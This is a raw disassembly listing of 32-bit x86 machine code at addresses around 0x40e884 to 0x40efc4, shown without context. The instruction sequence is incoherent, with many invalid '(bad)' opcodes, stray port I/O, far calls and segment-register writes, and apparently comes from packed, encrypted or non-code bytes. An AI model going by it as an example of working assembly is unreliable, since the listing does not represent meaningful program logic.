  40e884:	imul   esp,DWORD PTR [ebp+0x73],0x379927e1
  40e88b:	aaa    
  40e88c:	mov    ebx,0xbddaa9a4
  40e891:	fisubr WORD PTR [edx-0x13]
  40e894:	mov    bh,BYTE PTR [ebx+0x1094a1c7]
  40e89a:	add    DWORD PTR [edx],ecx
  40e89c:	cs cmc 
  40e89e:	push   ecx
  40e89f:	mov    cl,0xa1
  40e8a1:	imul   esp,DWORD PTR [edi],0x2
  40e8a4:	inc    edi
  40e8a5:	pusha  
  40e8a6:	dec    ebp
  40e8a7:	fld    TBYTE PTR [ebx]
  40e8a9:	fwait
  40e8aa:	scas   eax,DWORD PTR es:[edi]
  40e8ab:	je     0x40e879
  40e8ad:	aam    0xc1
  40e8af:	aas    
  40e8b0:	outs   dx,DWORD PTR ds:[esi]
  40e8b1:	(bad)  
  40e8b2:	lds    edx,FWORD PTR [eax+0x4913af81]
  40e8b8:	mov    cl,0x31
  40e8ba:	pop    ds
  40e8bb:	arpl   WORD PTR [edi-0x5e],cx
  40e8be:	add    BYTE PTR [ebx],ch
  40e8c0:	pop    ebp
  40e8c1:	pop    edi
  40e8c2:	push   0xf0cf6cac
  40e8c7:	sbb    ecx,eax
  40e8c9:	stc    
  40e8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8cb:	cmp    eax,0x3fd0f062
  40e8d0:	pop    ebx
  40e8d1:	mov    bl,0xc2
  40e8d3:	inc    BYTE PTR [esi-0x6e]
  40e8d6:	cmp    eax,0xa0d09b82
  40e8db:	cdq    
  40e8dc:	ja     0x40e909
  40e8de:	stos   BYTE PTR es:[di],al
  40e8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8e1:	sub    al,BYTE PTR [ecx+eax*2]
  40e8e4:	mov    eax,0xc6801fd0
  40e8e9:	mov    ds:0x544c063d,eax
  40e8ee:	sbb    BYTE PTR [edi+0x58ed9af],cl
  40e8f4:	push   ss
  40e8f5:	inc    edx
  40e8f6:	inc    ebx
  40e8f7:	aaa    
  40e8f8:	not    ebp
  40e8fa:	inc    eax
  40e8fb:	or     dh,BYTE PTR [ebp+0x2eb4e92c]
  40e901:	inc    ebp
  40e902:	add    ebp,DWORD PTR [edi+0x49]
  40e905:	fidivr WORD PTR [edi+eax*8+0x5]
  40e909:	out    dx,al
  40e90a:	out    0x2b,al
  40e90c:	ror    BYTE PTR fs:[ecx+0x27],0x51
  40e911:	adc    eax,0x657b5a9
  40e916:	fs scas eax,DWORD PTR es:[edi]
  40e918:	ror    BYTE PTR [ecx+0x5310bb89],cl
  40e91e:	pop    DWORD PTR [edi]
  40e920:	sbb    BYTE PTR [ebp-0x2dc19f94],ah
  40e926:	into   
  40e927:	cmp    al,0xdd
  40e929:	sub    ah,ah
  40e92b:	js     0x40e8cb
  40e92d:	and    edx,DWORD PTR [edx-0x4]
  40e930:	int3   
  40e931:	xor    dl,BYTE PTR [ebp-0xf1fae30]
  40e937:	ja     0x40e8f7
  40e939:	imul   ebx,DWORD PTR [ecx],0xe6ae756
  40e93f:	mov    dl,0x7
  40e941:	mov    eax,0x83af899b
  40e946:	mov    esp,0x942e2db5
  40e94b:	push   ecx
  40e94c:	scas   al,BYTE PTR es:[edi]
  40e94d:	mov    dl,0xf6
  40e94f:	fimul  WORD PTR [ebx+0x2532edcd]
  40e955:	and    DWORD PTR [edx+0x14f610d3],0xffffffe6
  40e95c:	mov    ebp,0x4e3e3b2a
  40e961:	push   esi
  40e962:	dec    ecx
  40e963:	enter  0x2466,0x5c
  40e967:	and    dh,BYTE PTR [edi+0x23]
  40e96a:	ret    
  40e96b:	mov    es,WORD PTR [ebx]
  40e96d:	jo     0x40e98c
  40e96f:	pop    esi
  40e970:	fbld   TBYTE PTR [eax-0x7a149aff]
  40e976:	cs jae 0x40e98a
  40e979:	and    al,0x27
  40e97b:	or     al,0x3b
  40e97d:	or     edi,ebx
  40e97f:	pop    es
  40e980:	loope  0x40e90d
  40e982:	cld    
  40e983:	aaa    
  40e984:	mov    al,0xda
  40e986:	fcom   QWORD PTR [ebp+edx*4+0x62]
  40e98a:	mov    ecx,0xd716b977
  40e98f:	adc    DWORD PTR [edi],0xffffff8f
  40e992:	jae    0x40e932
  40e994:	imul   ecx,DWORD PTR [ecx-0x37],0x68
  40e998:	leave  
  40e999:	or     eax,DWORD PTR [ebx]
  40e99b:	xchg   esi,eax
  40e99c:	outs   dx,DWORD PTR ds:[esi]
  40e99d:	jmp    0x40e92a
  40e99f:	mov    ah,0xb6
  40e9a1:	add    DWORD PTR ds:0x30a5b3da,0xffffffa8
  40e9a8:	fdivr  QWORD PTR [eax]
  40e9aa:	sbb    ch,cl
  40e9ac:	mov    dh,0x7d
  40e9ae:	retf   
  40e9af:	das    
  40e9b0:	mov    bl,0xe0
  40e9b2:	arpl   WORD PTR ds:0x1c056708,bp
  40e9b8:	mov    ebp,0xddba5ac4
  40e9bd:	inc    esi
  40e9be:	out    0xdb,al
  40e9c0:	aaa    
  40e9c1:	addr16 popf 
  40e9c3:	(bad)  [esi]
  40e9c5:	fild   DWORD PTR [ebp-0x47]
  40e9c8:	mov    bh,0x36
  40e9ca:	sub    ah,BYTE PTR [esi]
  40e9cc:	and    DWORD PTR [ebx],eax
  40e9ce:	mov    dl,0x46
  40e9d0:	out    0xe4,al
  40e9d2:	in     al,dx
  40e9d3:	add    ebx,DWORD PTR [esi]
  40e9d5:	dec    eax
  40e9d6:	psubw  mm2,QWORD PTR [ecx-0x27]
  40e9da:	cmp    BYTE PTR ds:0xf6039bbe,0x49
  40e9e1:	push   ecx
  40e9e2:	dec    ebp
  40e9e3:	push   edi
  40e9e4:	mov    DWORD PTR [edi+0x5e],esp
  40e9e7:	push   esp
  40e9e8:	jl     0x40ea60
  40e9ea:	jmp    0x40ea0f
  40e9ec:	cmc    
  40e9ed:	xchg   BYTE PTR [ecx-0x42],ch
  40e9f0:	mov    ah,0x87
  40e9f2:	cdq    
  40e9f3:	xor    al,cl
  40e9f5:	pop    es
  40e9f6:	cld    
  40e9f7:	lock push edi
  40e9f9:	and    bl,BYTE PTR [esi-0x2a5f0ff8]
  40e9ff:	inc    edx
  40ea00:	jle    0x40ea05
  40ea02:	dec    ebx
  40ea03:	push   esp
  40ea04:	aad    0xb3
  40ea06:	fild   QWORD PTR [esi]
  40ea08:	mov    al,0xf3
  40ea0b:	loopne 0x40ea2d
  40ea0d:	or     DWORD PTR [esi],0x6423d445
  40ea13:	ret    
  40ea14:	jno    0x40ea47
  40ea16:	adc    eax,0xf49b9031
  40ea1b:	cmp    BYTE PTR [ecx+eiz*8],dl
  40ea1e:	inc    ebp
  40ea1f:	or     al,0x66
  40ea21:	xor    al,0x4b
  40ea23:	dec    edi
  40ea24:	cwde   
  40ea25:	jge    0x40ea93
  40ea27:	sub    eax,0x92419729
  40ea2c:	xor    edx,DWORD PTR [eax+0x43]
  40ea2f:	mov    ah,0x1d
  40ea31:	mov    esp,0xc8b32a29
  40ea36:	mov    bh,0x8c
  40ea38:	cdq    
  40ea39:	es jno 0x40e9d9
  40ea3c:	mov    ch,0xab
  40ea3e:	pop    edx
  40ea3f:	and    ebx,DWORD PTR [esi]
  40ea41:	(bad)  
  40ea42:	ret    
  40ea43:	sbb    dh,cl
  40ea45:	or     eax,0x441a737e
  40ea4a:	and    BYTE PTR [esi+0x6150083a],dl
  40ea50:	fdiv   DWORD PTR ss:[ebx+ecx*4+0x62]
  40ea55:	fidiv  DWORD PTR ds:0xc73368a
  40ea5b:	jns    0x40e9f4
  40ea5d:	into   
  40ea5e:	aad    0x1d
  40ea60:	xor    ch,BYTE PTR [eax]
  40ea62:	shl    ecx,1
  40ea64:	retf   0x78e2
  40ea67:	mov    al,ds:0x59f2b776
  40ea6c:	sub    al,BYTE PTR [edi+0x43]
  40ea6f:	cld    
  40ea70:	jo     0x40eadf
  40ea72:	jle    0x40eaea
  40ea74:	and    eax,0xa5474070
  40ea79:	repnz mov al,ds:0xc720a193
  40ea7f:	jge    0x40ea1e
  40ea81:	inc    ebx
  40ea82:	call   FWORD PTR [edi+eiz*4-0x7e]
  40ea86:	sti    
  40ea87:	outs   dx,DWORD PTR ds:[esi]
  40ea88:	aas    
  40ea89:	lods   eax,DWORD PTR ds:[esi]
  40ea8a:	mov    ebp,0xd676e6cf
  40ea8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea90:	ror    BYTE PTR [esi-0x75],cl
  40ea93:	fsub   DWORD PTR [esi+0x1b0d117e]
  40ea99:	dec    edi
  40ea9a:	(bad)  
  40ea9b:	frstor [eax]
  40ea9d:	or     BYTE PTR [ebx],dh
  40ea9f:	push   ss
  40eaa0:	retf   0x8414
  40eaa3:	jb     0x40eb16
  40eaa5:	int    0xde
  40eaa7:	push   edi
  40eaa8:	push   edi
  40eaa9:	xor    eax,0xfb4ca88e
  40eaae:	in     eax,dx
  40eaaf:	add    al,0xd3
  40eab1:	jge    0x40ea48
  40eab3:	jg     0x40eaa3
  40eab5:	cli    
  40eab6:	sub    eax,DWORD PTR [esp+eiz*2+0x13]
  40eaba:	push   ss
  40eabb:	inc    ebp
  40eabc:	mov    esp,0xead3803b
  40eac1:	add    DWORD PTR ds:0x3c94b6b5,eax
  40eac7:	pop    esi
  40eac8:	xchg   esp,eax
  40eac9:	xchg   esi,eax
  40eaca:	pop    esi
  40eacb:	adc    BYTE PTR [eax-0x5a],dh
  40eace:	mov    eax,ds:0xf5f47ee8
  40ead3:	mov    bh,0xca
  40ead5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead6:	sbb    dl,BYTE PTR [eax+0x3006625c]
  40eadc:	push   cs
  40eadd:	cmp    BYTE PTR [esi-0x1a2cdf2a],dl
  40eae3:	loop   0x40eb37
  40eae5:	jmp    0xb706299
  40eaea:	jg     0x40eb10
  40eaec:	fdiv   QWORD PTR [ecx-0x3a1a92de]
  40eaf2:	mov    ebp,cs
  40eaf4:	sbb    al,0xb0
  40eaf6:	xor    ch,bh
  40eaf8:	sbb    al,0x96
  40eafa:	mov    dl,0xc8
  40eafc:	es loope 0x40ea94
  40eaff:	ds pop edx
  40eb01:	inc    edx
  40eb02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb03:	inc    esi
  40eb04:	mov    edi,0x57ccea62
  40eb09:	sbb    edi,0xe7039cdf
  40eb0f:	dec    ebx
  40eb10:	fcomp  QWORD PTR [edi-0x7276ce42]
  40eb16:	es (bad) 
  40eb18:	arpl   WORD PTR [edx+0x58],ax
  40eb1b:	push   0x16
  40eb1d:	test   BYTE PTR ds:0xf99b4e8f,ah
  40eb23:	xchg   edx,eax
  40eb24:	test   ebx,edi
  40eb26:	adc    eax,0x197b3efe
  40eb2b:	pop    es
  40eb2c:	out    dx,al
  40eb2d:	xor    al,0xe3
  40eb2f:	pop    esp
  40eb30:	mov    al,ds:0x19e32071
  40eb35:	mov    bh,0xe3
  40eb37:	(bad)  
  40eb38:	jb     0x40eb2f
  40eb3a:	fcomi  st,st(5)
  40eb3c:	(bad)  
  40eb3d:	mov    bh,0xb0
  40eb3f:	cmp    ah,BYTE PTR [edi]
  40eb41:	mov    ah,0x3e
  40eb43:	mov    ?,WORD PTR [edi]
  40eb45:	jmp    0x40eba9
  40eb47:	dec    esp
  40eb48:	in     eax,dx
  40eb49:	or     ebp,DWORD PTR [ecx]
  40eb4b:	loopne 0x40eb8d
  40eb4d:	(bad)  
  40eb4f:	sbb    al,0xa9
  40eb51:	arpl   WORD PTR [esp+edi*4],sp
  40eb54:	add    BYTE PTR [esi+0x59],dh
  40eb57:	loope  0x40eb52
  40eb59:	add    bh,BYTE PTR [ebp+0x3b]
  40eb5c:	sbb    bl,BYTE PTR [eax-0x5fa1cf12]
  40eb62:	push   0xffffffda
  40eb64:	scas   al,BYTE PTR es:[edi]
  40eb65:	stos   DWORD PTR es:[edi],eax
  40eb66:	pop    esp
  40eb67:	cdq    
  40eb68:	pusha  
  40eb69:	lods   eax,DWORD PTR ds:[esi]
  40eb6a:	and    cl,bh
  40eb6c:	adc    al,0xab
  40eb6e:	sub    al,0x19
  40eb70:	sub    BYTE PTR [edi+0x6f],bl
  40eb73:	sub    cl,BYTE PTR [ecx+0x7421faec]
  40eb79:	mov    eax,0xda31af3c
  40eb7e:	data16 stc 
  40eb80:	mov    ah,0x3f
  40eb82:	daa    
  40eb83:	pop    eax
  40eb84:	mov    ebp,0x7f1f0cda
  40eb89:	out    dx,eax
  40eb8a:	or     al,0x38
  40eb8c:	es inc ebp
  40eb8e:	mov    ah,0x1a
  40eb90:	pop    ecx
  40eb91:	adc    bl,bh
  40eb93:	daa    
  40eb94:	arpl   WORD PTR [ebx+0x65],di
  40eb97:	mov    fs,WORD PTR [ecx]
  40eb99:	push   0x72
  40eb9b:	iret   
  40eb9c:	cmp    BYTE PTR [edx],bh
  40eb9e:	dec    edi
  40eb9f:	ret    
  40eba0:	lahf   
  40eba1:	out    dx,al
  40eba2:	adc    DWORD PTR [edx-0x17],ecx
  40eba5:	inc    ecx
  40eba6:	leave  
  40eba7:	shr    DWORD PTR [eax+0x4cfbe57],cl
  40ebad:	pop    eax
  40ebae:	cmc    
  40ebaf:	repnz lds edi,FWORD PTR [ebp-0x2512a26a]
  40ebb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb7:	push   cs
  40ebb8:	fs test eax,0xfb71471e
  40ebbe:	cli    
  40ebbf:	push   ebx
  40ebc0:	out    dx,al
  40ebc1:	xchg   DWORD PTR [ebp+edi*8+0x52cabc5c],esp
  40ebc8:	sti    
  40ebc9:	(bad)  
  40ebca:	mul    dh
  40ebcc:	inc    esi
  40ebcd:	ret    
  40ebce:	pushf  
  40ebcf:	rol    DWORD PTR [esi+0x122fd3c3],0x76
  40ebd6:	mov    ds:0x3cb7f080,eax
  40ebdb:	fidivr WORD PTR [esp+ecx*4-0x2b23dfa]
  40ebe2:	outs   dx,BYTE PTR ds:[esi]
  40ebe3:	mov    ebp,0x67aebea2
  40ebe8:	xchg   esi,eax
  40ebe9:	idiv   BYTE PTR ds:0x7290df6
  40ebef:	mov    al,0x1e
  40ebf1:	outs   dx,BYTE PTR ds:[esi]
  40ebf2:	test   al,al
  40ebf4:	inc    ebx
  40ebf5:	xor    dh,BYTE PTR [edx+edx*8]
  40ebf8:	mov    dh,0x39
  40ebfa:	cmp    dl,BYTE PTR [ecx+esi*4-0x2ffd5345]
  40ec01:	xor    al,0xb4
  40ec03:	dec    ecx
  40ec04:	push   ebx
  40ec05:	sub    ecx,edi
  40ec07:	daa    
  40ec08:	aad    0xc1
  40ec0a:	fwait
  40ec0b:	retf   
  40ec0c:	dec    edi
  40ec0d:	ins    DWORD PTR es:[edi],dx
  40ec0e:	xchg   esi,edx
  40ec10:	test   dh,cl
  40ec12:	mov    esp,0xd7afb0ee
  40ec17:	(bad)  
  40ec18:	cmp    edx,ecx
  40ec1a:	imul   edi,DWORD PTR [edx-0x39],0xffffffa3
  40ec1e:	or     al,0x8c
  40ec20:	inc    ebx
  40ec21:	outs   dx,DWORD PTR ds:[esi]
  40ec22:	mov    ebp,0xc99bf0f4
  40ec27:	loop   0x40ebfb
  40ec29:	xor    al,0xe
  40ec2b:	repnz xchg ebx,eax
  40ec2d:	and    BYTE PTR [eax+eiz*8],0x7b
  40ec31:	push   eax
  40ec32:	shr    BYTE PTR [edx-0x3c2395e6],1
  40ec38:	and    eax,0xb62b7d79
  40ec3d:	lea    ecx,[ecx-0x4d]
  40ec40:	ja     0x40ec94
  40ec42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec43:	(bad)  
  40ec45:	mov    esi,0xf23cb76d
  40ec4a:	jge    0x40ec2c
  40ec4c:	cmp    edi,ebp
  40ec4e:	xchg   esp,eax
  40ec4f:	fimul  WORD PTR [ecx]
  40ec51:	dec    ebx
  40ec52:	push   edx
  40ec53:	fsubr  QWORD PTR [esi-0x6d]
  40ec56:	retf   
  40ec57:	mov    dh,0xda
  40ec59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec5a:	in     al,0xdf
  40ec5c:	sub    ch,BYTE PTR [esi-0x1e]
  40ec5f:	inc    edx
  40ec60:	xor    dh,BYTE PTR [esi-0x29]
  40ec63:	sub    dl,dh
  40ec65:	sub    cl,ch
  40ec67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec68:	mov    cs,WORD PTR ds:0x92822fcf
  40ec6e:	or     bh,BYTE PTR [edi+0x2f194]
  40ec74:	addr16 in al,dx
  40ec76:	pop    ebx
  40ec77:	jae    0x40ecbe
  40ec79:	xor    eax,0x74493b50
  40ec7e:	rcl    DWORD PTR [eax*8-0x260278e0],cl
  40ec85:	push   ecx
  40ec86:	xchg   edx,eax
  40ec87:	jnp    0x40ecd8
  40ec89:	jecxz  0x40ed04
  40ec8b:	in     eax,dx
  40ec8c:	aad    0x1c
  40ec8e:	sbb    BYTE PTR [edi+0x22],bl
  40ec91:	dec    esp
  40ec92:	in     eax,0x3e
  40ec94:	rcr    DWORD PTR [esi-0x731edc2d],1
  40ec9a:	push   0x17
  40ec9c:	add    bl,al
  40ec9e:	push   ebx
  40ec9f:	test   al,0x13
  40eca1:	mov    edx,0x8789e8ca
  40eca6:	fiadd  DWORD PTR [ebp+esi*1+0x54]
  40ecaa:	test   DWORD PTR [ecx-0x74],0xfce22816
  40ecb1:	das    
  40ecb2:	cli    
  40ecb3:	outs   dx,DWORD PTR ds:[esi]
  40ecb4:	arpl   WORD PTR [edx],dx
  40ecb6:	pop    ecx
  40ecb7:	loope  0x40ec8e
  40ecb9:	je     0x40ecc1
  40ecbb:	in     al,0x1d
  40ecbd:	adc    al,0x1e
  40ecbf:	cmc    
  40ecc0:	adc    BYTE PTR [ecx-0x6dfebea3],bl
  40ecc6:	xchg   edx,eax
  40ecc7:	in     eax,0xa4
  40ecc9:	push   es
  40ecca:	test   al,0x60
  40eccc:	shl    ch,1
  40ecce:	in     al,dx
  40eccf:	push   ds
  40ecd0:	retf   0xc115
  40ecd3:	hlt    
  40ecd4:	push   ebp
  40ecd5:	repnz ds cld 
  40ecd8:	mov    ah,0x61
  40ecda:	mov    esp,0x72ae1b65
  40ecdf:	(bad)  
  40ece0:	call   0x8f36ae66
  40ece5:	dec    ebp
  40ece6:	aad    0x95
  40ece8:	hlt    
  40ece9:	test   eax,0x25b0c76f
  40ecee:	xchg   bl,ch
  40ecf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf1:	xor    DWORD PTR [edx],ecx
  40ecf3:	or     DWORD PTR [edi+0x6],ebp
  40ecf6:	je     0x40ec8c
  40ecf8:	mov    dh,0x90
  40ecfa:	repz push ss
  40ecfc:	popa   
  40ecfd:	jg     0x40ed71
  40ecff:	jecxz  0x40ec94
  40ed01:	imul   BYTE PTR [ecx+0x520e64eb]
  40ed07:	cs imul eax,esi,0x61
  40ed0b:	mov    al,0x86
  40ed0d:	stc    
  40ed0e:	push   ss
  40ed0f:	call   0x8a4f:0x71c2fbca
  40ed16:	call   0x68ec698d
  40ed1b:	cmp    al,0x85
  40ed1d:	or     edi,ecx
  40ed1f:	jne    0x40ecee
  40ed21:	ds aam 0xd8
  40ed24:	mov    al,BYTE PTR [ebp+0x53e90a18]
  40ed2a:	sbb    DWORD PTR [esi],ebp
  40ed2c:	addr16 ret 
  40ed2e:	(bad)
  40ed31:	cli    
  40ed32:	int3   
  40ed33:	retf   0xe9a1
  40ed36:	int3   
  40ed37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed38:	cwde   
  40ed39:	adc    eax,0x98539f11
  40ed3e:	jb     0x40ed07
  40ed40:	js     0x40ecdd
  40ed42:	cld    
  40ed43:	jo     0x40ed49
  40ed45:	int    0xeb
  40ed47:	and    ch,ah
  40ed49:	xchg   DWORD PTR [eax-0x67],ebp
  40ed4c:	push   cs
  40ed4d:	outs   dx,DWORD PTR ds:[esi]
  40ed4e:	or     esp,ebx
  40ed50:	xor    eax,0x76ffae41
  40ed55:	mov    ecx,0x47427b9
  40ed5a:	sub    BYTE PTR [ecx-0x36d44c0b],bl
  40ed60:	mov    al,ds:0xeef06f9e
  40ed65:	pop    eax
  40ed66:	push   esi
  40ed68:	test   eax,edx
  40ed6a:	outs   dx,DWORD PTR ds:[esi]
  40ed6b:	pop    ebx
  40ed6c:	xor    ch,0x2f
  40ed6f:	jge    0x40ed9f
  40ed71:	int3   
  40ed72:	fdivr  QWORD PTR [ecx]
  40ed74:	sbb    dh,BYTE PTR [edx+0xade8525]
  40ed7a:	int    0x64
  40ed7c:	jl     0x40ed93
  40ed7e:	add    dl,BYTE PTR [edx+0x183e2af3]
  40ed84:	rcl    edi,1
  40ed86:	lods   eax,DWORD PTR ds:[esi]
  40ed87:	(bad)  
  40ed88:	enter  0x2a66,0x3b
  40ed8c:	jnp    0x40ed27
  40ed8e:	(bad)  
  40ed8f:	fwait
  40ed90:	xor    BYTE PTR [eax-0x1933e6eb],al
  40ed96:	pushf  
  40ed97:	in     al,0x62
  40ed99:	add    al,0xc8
  40ed9b:	(bad)  
  40ed9c:	sub    al,0x61
  40ed9e:	ins    DWORD PTR es:[edi],dx
  40ed9f:	stos   DWORD PTR es:[edi],eax
  40eda0:	daa    
  40eda1:	es jle 0x40ed25
  40eda4:	loopne 0x40eddb
  40eda6:	psllq  mm2,QWORD PTR [edx+edx*1]
  40edaa:	xchg   ebx,eax
  40edab:	in     eax,0xc9
  40edad:	das    
  40edae:	in     al,0x69
  40edb0:	pop    eax
  40edb1:	mov    edx,0xda0f0110
  40edb6:	cmp    DWORD PTR [edi],esp
  40edb8:	mov    al,ds:0x3c3a90e5
  40edbd:	mov    ds:0x52eeec66,eax
  40edc2:	push   esi
  40edc3:	inc    ebp
  40edc4:	sbb    eax,0x91bd40ee
  40edc9:	xor    DWORD PTR [ebx+edx*2],ebx
  40edcc:	sub    DWORD PTR [eax+0x63],0xffffffa4
  40edd0:	push   cs
  40edd1:	mov    ah,0xa9
  40edd3:	sub    al,al
  40edd5:	mov    ds:0x4d040e89,eax
  40edda:	push   cs
  40eddb:	add    BYTE PTR [edi],dl
  40eddd:	mov    ebp,0x6c948c18
  40ede2:	and    bh,al
  40ede4:	loop   0x40edab
  40ede6:	jae    0x40ed9a
  40ede8:	test   DWORD PTR [ebp+0x65],esp
  40edeb:	ret    0x8a3
  40edee:	mov    cl,0x24
  40edf0:	das    
  40edf1:	(bad)  
  40edf3:	push   edi
  40edf4:	jle    0x40ee49
  40edf6:	lods   eax,DWORD PTR ds:[esi]
  40edf7:	das    
  40edf8:	push   ds
  40edf9:	loop   0x40edaa
  40edfb:	fiadd  WORD PTR [edx+0x7af5da50]
  40ee01:	icebp  
  40ee02:	arpl   cx,ax
  40ee04:	xchg   edi,eax
  40ee05:	loop   0x40ed8f
  40ee07:	and    DWORD PTR [edx+0x688940e6],esp
  40ee0d:	push   esp
  40ee0e:	pop    ds
  40ee0f:	shr    BYTE PTR ds:0x85346dde,cl
  40ee15:	sbb    cl,BYTE PTR [ecx+esi*1]
  40ee18:	mov    dl,0xec
  40ee1a:	bound  edi,QWORD PTR [ecx]
  40ee1c:	or     bh,dl
  40ee1e:	aaa    
  40ee1f:	add    ecx,esp
  40ee21:	imul   esi,DWORD PTR [ebp-0x315bf76d],0xfffffff8
  40ee28:	rol    BYTE PTR [edi-0x44],1
  40ee2b:	mov    cl,0xb6
  40ee2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee2e:	inc    ebp
  40ee2f:	mov    ebx,0x2e79138d
  40ee34:	mov    cl,0xda
  40ee36:	(bad)  
  40ee37:	xchg   ecx,eax
  40ee38:	push   ebp
  40ee39:	popf   
  40ee3a:	pop    ss
  40ee3b:	popa   
  40ee3c:	xchg   ebp,eax
  40ee3d:	mov    dl,0x36
  40ee3f:	adc    al,BYTE PTR [edx+eiz*1+0x4b]
  40ee43:	mov    edi,DWORD PTR [eax+0x6]
  40ee46:	icebp  
  40ee47:	ror    ah,cl
  40ee49:	out    0x51,eax
  40ee4b:	sbb    al,0x33
  40ee4d:	push   ds
  40ee4e:	mov    cl,BYTE PTR [ebx-0x5f]
  40ee51:	adc    eax,DWORD PTR [eax+0x20192f75]
  40ee57:	xor    al,0xdf
  40ee59:	out    0x79,al
  40ee5b:	mov    al,0x86
  40ee5d:	jo     0x40edf3
  40ee5f:	add    bh,BYTE PTR [eax+0x1aaca599]
  40ee65:	(bad)
  40ee68:	div    BYTE PTR [eax+0x35fc4440]
  40ee6e:	rol    BYTE PTR [edi+0x6826a81],1
  40ee74:	repz rcl BYTE PTR [ebx-0x55baad],1
  40ee7b:	pextrw esp,(bad),0xc5
  40ee7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7e:	gs popa 
  40ee80:	adc    dl,BYTE PTR [edx+0x49]
  40ee83:	shl    BYTE PTR ds:[ecx*4+0x4f92ec0d],cl
  40ee8b:	or     BYTE PTR [eax],0x76
  40ee8e:	mov    eax,edx
  40ee90:	jne    0x40ef0a
  40ee92:	add    DWORD PTR [eax+0x7f65379e],edi
  40ee98:	pop    es
  40ee99:	push   ebp
  40ee9a:	push   eax
  40ee9b:	cmp    cl,BYTE PTR [ebx-0x29]
  40ee9e:	sar    DWORD PTR [edi],cl
  40eea0:	xchg   esp,eax
  40eea1:	add    esp,DWORD PTR [esi+edx*1+0x34]
  40eea5:	(bad)  
  40eea6:	fsubr  QWORD PTR [eax-0x34]
  40eea9:	adc    bl,bl
  40eeab:	lds    esp,FWORD PTR [eax+0x5896f529]
  40eeb1:	lods   eax,DWORD PTR ds:[esi]
  40eeb2:	into   
  40eeb3:	pop    ecx
  40eeb4:	xchg   ecx,eax
  40eeb5:	call   0x1c91:0xdc8841d1
  40eebc:	sbb    ah,BYTE PTR [ebx]
  40eebe:	mov    edx,0x69e15a4e
  40eec3:	pop    esi
  40eec4:	pop    ds
  40eec5:	mov    cs,ecx
  40eec7:	xchg   edi,eax
  40eec8:	fbstp  TBYTE PTR [esi]
  40eeca:	mov    al,0x7f
  40eecc:	jb     0x40ee9b
  40eece:	pusha  
  40eecf:	xchg   esp,eax
  40eed0:	or     eax,0x24d05fac
  40eed5:	jb     0x40ef34
  40eed7:	push   esi
  40eed8:	ds popa 
  40eeda:	mov    DWORD PTR [ecx+0x67],eax
  40eedd:	fisttp QWORD PTR [edx+0x2770e055]
  40eee3:	mov    al,0xc7
  40eee5:	in     eax,dx
  40eee6:	mov    ah,0xb0
  40eee8:	fs sti 
  40eeea:	mov    dh,0xa4
  40eeec:	xchg   ebx,eax
  40eeed:	ins    DWORD PTR es:[edi],dx
  40eeee:	mov    al,ds:0xa3ffb7a7
  40eef3:	je     0x40ee90
  40eef5:	fdivr  DWORD PTR [esi-0x1e6ec78c]
  40eefb:	push   esi
  40eefc:	mov    ds:0x9f35b2da,al
  40ef01:	xor    ebp,eax
  40ef03:	mov    eax,0x6c819112
  40ef08:	das    
  40ef09:	shl    BYTE PTR [esp+ebp*1-0x224c778],cl
  40ef10:	mov    cl,0xd4
  40ef12:	fcomp  QWORD PTR [esi]
  40ef14:	call   0x9aa2:0x9ae39401
  40ef1b:	retf   
  40ef1c:	in     al,dx
  40ef1d:	sub    edx,DWORD PTR [esi+0x3b]
  40ef20:	push   ebx
  40ef21:	cmp    DWORD PTR [edi],edx
  40ef23:	cmp    ebp,DWORD PTR [edx-0x64]
  40ef26:	ret    0x5b94
  40ef29:	add    BYTE PTR [edx+0x76f32afa],ch
  40ef2f:	retf   
  40ef30:	fsubr  QWORD PTR [ebx+0x7dece926]
  40ef36:	jae    0x40eeea
  40ef38:	jl     0x40eeed
  40ef3a:	pop    es
  40ef3b:	jne    0x40ef31
  40ef3d:	scas   eax,DWORD PTR es:[edi]
  40ef3e:	push   esi
  40ef3f:	and    edx,DWORD PTR [edi+0x6bb61f58]
  40ef45:	xchg   esp,eax
  40ef46:	lea    esi,[ebp+0x3f8b87cf]
  40ef4c:	mov    ch,ah
  40ef4e:	sti    
  40ef4f:	push   0xffffffe2
  40ef51:	fdiv   QWORD PTR [edi]
  40ef53:	adc    DWORD PTR [eax-0x35],edx
  40ef56:	pop    es
  40ef57:	ds nop
  40ef59:	mov    al,ds:0xdbbfbd65
  40ef5e:	push   ecx
  40ef5f:	cdq    
  40ef60:	xchg   DWORD PTR [ecx-0x32902d9],ebx
  40ef66:	sar    BYTE PTR [eax+ebp*2-0x78fb7cb2],0x7f
  40ef6e:	sbb    al,0x99
  40ef70:	sub    BYTE PTR [eax-0x21],ah
  40ef73:	arpl   di,bp
  40ef75:	or     eax,0x1c20d532
  40ef7a:	adc    DWORD PTR [eax+0x4716bb88],0xffffffd4
  40ef81:	push   0x8ec73689
  40ef86:	mov    bl,0x6a
  40ef88:	lock mov ah,0x2
  40ef8b:	and    eax,0xbafcb244
  40ef90:	lods   eax,DWORD PTR ds:[esi]
  40ef91:	mov    bl,0x4e
  40ef93:	js     0x40ef4a
  40ef95:	jle    0x40ef39
  40ef97:	add    ch,BYTE PTR ds:0xf3855436
  40ef9d:	mov    ecx,0xd433a74
  40efa2:	mov    ch,0x70
  40efa4:	pop    ecx
  40efa5:	pop    edx
  40efa6:	(bad)  
  40efa7:	fiadd  WORD PTR [edx-0x3ac8f2a8]
  40efad:	(bad)  
  40efae:	je     0x40efe2
  40efb0:	cmp    eax,0x27886bde
  40efb5:	scas   al,BYTE PTR es:[edi]
  40efb6:	(bad)  [ecx+0x4ca23aeb]
  40efbc:	rcl    BYTE PTR [esi+0x71],0x14
  40efc0:	push   ss
  40efc1:	push   eax
  40efc2:	cmp    ch,dh
  40efc4:	into   
